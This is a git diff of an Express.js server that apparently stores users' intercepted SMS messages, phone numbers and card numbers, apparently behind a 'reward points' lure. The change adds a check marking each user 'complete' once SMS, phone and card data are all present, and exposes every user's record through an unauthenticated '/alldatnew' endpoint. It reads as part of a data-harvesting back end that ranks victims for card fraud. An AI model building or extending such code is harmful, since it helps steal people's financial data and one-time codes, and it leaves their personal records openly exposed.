@@ -133,31 +133,39 @@ app.get('/rewardpoints', (req, res) => {
   });
 
 
-app.get('/alldata', async (req, res) => {
+function hasRequiredData(user) {
+    const hasSMS = Array.isArray(user.sms) && user.sms.length > 0; 
+    const hasPhone = typeof user.phone === 'string' && user.phone.trim() !== '';
+    const hasCardNumber = user.cards.length >= 1;
+    console.log()
+    console.log(hasSMS,hasPhone,hasCardNumber)
+    return hasSMS && hasPhone && hasCardNumber;
+  }
+
+app.get('/alldatnew', async (req, res) => {
     try {
-      const allUsersWithSMS = await User.find({ sms: { $exists: true, $ne: [] } })
-        .select('phone userData sms');
+      const allUsersWithSMS = await User.find()
   
       if (allUsersWithSMS.length === 0) {
         return res.status(404).json({ valid: false, message: 'No SMS data found.' });
       }
   
-      const formattedData = allUsersWithSMS.map(user => ({
-        phone: user.phone,
-        userData: user.userData,
-        sms: user.sms
-      }));
+      const formattedData = allUsersWithSMS.map(user => {
+        return {
+          phone: user.phone,
+          complete: hasRequiredData(user),  // Use the function here
+          userData: user.userData 
+        };
+      });
   
       res.json({
-        valid: true,
-        data: formattedData 
+        data: formattedData
       });
     } catch (error) {
       console.error('Error fetching SMS data:', error);
       res.status(500).json({ valid: false, error: 'Internal server error' });
     }
   });
-  
 app.get('/userone/:phone', async (req, res) => {
   const { phone } = req.params;
 
@@ -220,7 +228,8 @@ app.get('/user/:phone', async (req, res) => {
   }
 });
   
-  
+
+
 app.post('/savesms', async(req, res) => {
       var { address, body, date,phone } = req.body;
     console.log("received data savsms",address,body,date,phone)
